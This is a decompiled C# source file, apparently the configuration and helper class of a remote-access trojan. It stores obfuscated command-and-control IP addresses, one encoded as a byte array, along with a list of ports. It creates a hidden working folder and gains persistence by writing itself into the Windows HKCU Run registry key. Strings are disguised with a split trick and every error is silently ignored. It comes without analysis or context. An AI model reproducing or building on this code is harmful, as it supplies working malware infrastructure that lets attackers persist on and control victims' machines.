using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace hargardius;

internal static class DLAONIF
{
	public static string hargardiusappPath = "\\Mldhrab\\|hargardius".Split(new char[1] { '|' })[0];

	public static string hargardiusdefaultP = "111.115.60.18|hargardius".Split(new char[1] { '|' })[0];

	public static string hargardiusmainApp = "hargardius|hargardius".Split(new char[1] { '|' })[0];

	public static int[] ports = new int[5] { 4864, 5861, 13486, 16672, 18286 };

	public static byte[] hargardiusvpsips = new byte[14]
	{
		57, 53, 46, 49, 54, 56, 46, 49, 55, 54,
		46, 49, 52, 49
	};

	public static int hargardiusport;

	public static string hargardiuspc_id = "krimdh|hargardius".Split(new char[1] { '|' })[0];

	public static string hargardiusremvUser = "dlaiwncd|hargardius".Split(new char[1] { '|' })[0];

	public static string hargardiusfilesLogs = "ndirmar".Split(new char[1] { '|' })[0];

	public static string hargardiusAppPath = "";

	public static string hargardiusget_mpath()
	{
		if (hargardiusAppPath != "")
		{
			return hargardiusAppPath;
		}
		hargardiusAppPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + hargardiusappPath;
		try
		{
			if (!Directory.Exists(hargardiusAppPath))
			{
				Directory.CreateDirectory(hargardiusAppPath);
			}
			if (Directory.Exists(hargardiusAppPath))
			{
				return hargardiusAppPath;
			}
		}
		catch
		{
		}
		hargardiusAppPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + hargardiusappPath;
		try
		{
			if (!Directory.Exists(hargardiusAppPath))
			{
				Directory.CreateDirectory(hargardiusAppPath);
			}
			if (!Directory.Exists(hargardiusAppPath))
			{
				return hargardiusAppPath;
			}
		}
		catch
		{
		}
		hargardiusAppPath = Application.get_ExecutablePath();
		return hargardiusAppPath;
	}

	public static void hargardiusset_run(string app, string path)
	{
		try
		{
			string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|hargardius".Split(new char[1] { '|' })[0];
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			string text = hargardiuspc_id;
			object value = registryKey.GetValue(text + app);
			if (value == null)
			{
				registryKey.SetValue(text + app, path);
			}
			else if (value.ToString() != path)
			{
				registryKey.SetValue(text + app, path);
			}
		}
		catch
		{
		}
	}

	public static byte[] getByteArray(string value)
	{
		MemoryStream memoryStream = new MemoryStream();
		TextWriter textWriter = new StreamWriter(memoryStream);
		textWriter.Write(value);
		textWriter.Flush();
		memoryStream.Flush();
		return memoryStream.ToArray();
	}

	public static string hargardiusOsname()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!hargardius".Split(new char[1] { '!' })[0];
		}
	}
}
